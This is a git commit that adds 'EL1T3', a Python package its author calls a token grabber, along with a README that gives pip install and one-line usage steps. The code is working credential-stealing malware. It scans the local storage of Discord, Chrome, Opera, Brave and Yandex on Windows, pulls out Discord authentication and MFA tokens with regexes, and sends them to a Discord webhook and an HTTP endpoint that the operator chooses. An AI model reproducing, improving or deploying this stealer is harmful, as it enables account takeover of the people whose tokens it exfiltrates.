a7d1ea60e3faf4a6607ec95abb1ea9b565ca7e80
ιтѕ_Ѵιcнч#1337 <66045929+Its-Vichy@users.noreply.github.com>
2021-03-22 00:44:20 +0100

    🦄 тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer

---
+++ Grabber_Package/EL1T3/EL1T3.py
@@ -0,0 +1,83 @@
+#~~~~                                      ~~~~#
+# "тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer"
+#                ιтѕ_Ѵιcнч#1337                #
+#~~        github.com/Its-Vichy/EL1T3        ~~#
+#~~~~                                      ~~~~#
+
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import requests, os, re, json
+
+class Stealer():
+    def __init__(self):
+        self.Roaming    = os.getenv('APPDATA')
+        self.Local      = os.getenv('LOCALAPPDATA')
+        self.Discord_Path = [
+                                'ROAMING\\Discord',
+                                'ROAMING\\discordptb',
+                                'ROAMING\\discordcanary',
+                                'ROAMING\\Opera Software\\Opera Stable',
+                                'LOCAL\\Google\\Chrome\\User Data\\Default',
+                                'LOCAL\\Yandex\\YandexBrowser\\User Data\\Default',
+                                'LOCAL\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+                            ]
+
+    def GetTokens(self):
+        TokenList  = []
+        TokenFirst = []
+        for Path in self.Discord_Path:
+            Path = Path.replace('ROAMING', self.Roaming).replace('LOCAL', self.Local)
+            if os.path.exists(Path) == True:
+                Path += '\\Local Storage\\leveldb'
+                for file_name in os.listdir(Path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{Path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                            for token in re.findall(regex, line):
+                                if token[:20] not in TokenFirst:
+                                    TokenFirst.append(token[:20])
+                                    TokenList.append(token)
+        return TokenList
+
+class Grabber():
+    def __init__(self, Hook, Api):
+        self.Embeds = [  ]
+        self.Hook   = Hook
+        self.Tokn   = [ ]
+        self.Api    = Api
+    
+    def get_tokens(self):
+        TokenStealer = Stealer()
+        self.Tokn = TokenStealer.GetTokens()
+    
+    def create_embed(self):
+        for Token in self.Tokn:
+            self.Embeds.append(DiscordEmbed(description= f'> **Token:** `{Token}`', color='000001'))
+
+    def send_to_api(self):
+        if self.Api == None:
+            return
+            
+        for Token in self.Tokn:
+            try:
+                requests.post(f'{self.Api}{Token}')
+            except:
+                pass
+
+    def send(self):
+        if self.Hook == None:
+            return
+
+        webhook = DiscordWebhook(url= self.Hook)
+
+        for Embed in self.Embeds:
+            webhook.add_embed(Embed)
+        
+        webhook.execute()
+
+def EL1T3(webhook_url = None, api_url = None):
+    EL1T3_Client = Grabber(webhook_url, api_url)
+    EL1T3_Client.get_tokens()
+    EL1T3_Client.create_embed()
+    EL1T3_Client.send_to_api()
+    EL1T3_Client.send()
---
+++ Grabber_Package/README.md
@@ -0,0 +1,23 @@
+<h1 align="center">THE EL1T3 PROJECT</h1>
+
+<p align="center">
+  <b>Some link:</b><br>
+  <a href="https://discord.gg/4cajZdYpgS">Discord</a> |
+  <a href="https://www.youtube.com/channel/UC09GPm24_rdeOXa5KOmhDnw">YouTube</a> |
+  <a href="https://github.com/Its-Vichy">Github</a> |
+  <a href="https://pypi.org/project/EL1T3">PyPI Package</a><br>
+  <br>
+  <a> "тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer"</a><br>
+  <a>                 ιтѕ_Ѵιcнч#1337                </a><br>
+  <br>
+  <img src="https://media.discordapp.net/attachments/813683001496961065/813783642265747516/6869f4cf0c2f7349903668b562c4e403.gif">
+</p>
+<h1 align="center">FAST SETUP</h1>
+
+- **Install module with**: ``pip install EL1T3``
+
+```py
+from EL1T3 import EL1T3
+
+EL1T3('webhook-url', 'api-url') # api / webhook url can be None
+```
